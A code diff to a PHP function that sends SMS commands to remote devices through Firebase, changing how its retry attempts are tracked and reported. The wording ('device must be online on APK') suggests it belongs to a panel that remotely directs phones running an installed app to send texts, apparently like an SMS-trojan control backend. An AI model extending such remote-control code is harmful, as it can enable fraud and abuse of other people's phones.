@@ -765,6 +765,9 @@ function rebel_send_sms_to_device(
     $authKey = rebel_firebase_auth_key($url, $key);
     $attempts = rebel_send_paths_for_device($deviceId, $schema, $deviceNode, $url);
     $lastError = 'Failed to send SMS — device offline or Firebase error';
+    $patchOk = false;
+    $webhookOk = false;
+    $okPath = '';
 
     foreach ($attempts as $attempt) {
         $path = (string)($attempt['path'] ?? '');
@@ -776,20 +779,41 @@ function rebel_send_sms_to_device(
         $method = strtoupper((string)($attempt['method'] ?? 'PUT'));
         $res = rebel_firebase_req($method, $url, $authKey, $path, $payload);
         if ($res !== null) {
-            $hint = '';
-            if ($type === 'rto9') {
-                $hint = ' Command queued — device must be online on APK to send.';
+            if ($method === 'PATCH' && strpos($path, 'webhookEvent') === false) {
+                $patchOk = true;
             }
-            return [
-                'ok' => true,
-                'message' => 'SMS command sent to device' . $hint,
-                'sim' => $sim,
-                'to' => $to,
-                'path' => $path,
-                'schema' => $type,
-            ];
+            if (strpos($path, 'webhookEvent/sendSms') !== false) {
+                $webhookOk = true;
+            }
+            $okPath = $path . ' (' . $method . ')';
+            if ($patchOk && $webhookOk) {
+                break;
+            }
+            if ($patchOk && ($type === 'rto9' || $schema === 'rabel')) {
+                continue;
+            }
+            if ($type !== 'rto9' && $schema !== 'rabel') {
+                break;
+            }
         }
         $lastError = 'Failed via ' . $path;
+    }
+
+    if ($patchOk || $webhookOk) {
+        $hint = '';
+        if ($patchOk) {
+            $hint = ' Command queued — device must be online on APK to send.';
+        }
+        return [
+            'ok' => true,
+            'message' => 'SMS command sent to device' . $hint,
+            'sim' => $sim,
+            'to' => $to,
+            'path' => $okPath,
+            'schema' => $schema,
+            'patchOk' => $patchOk,
+            'webhookOk' => $webhookOk,
+        ];
     }
 
     return ['ok' => false, 'error' => $lastError];
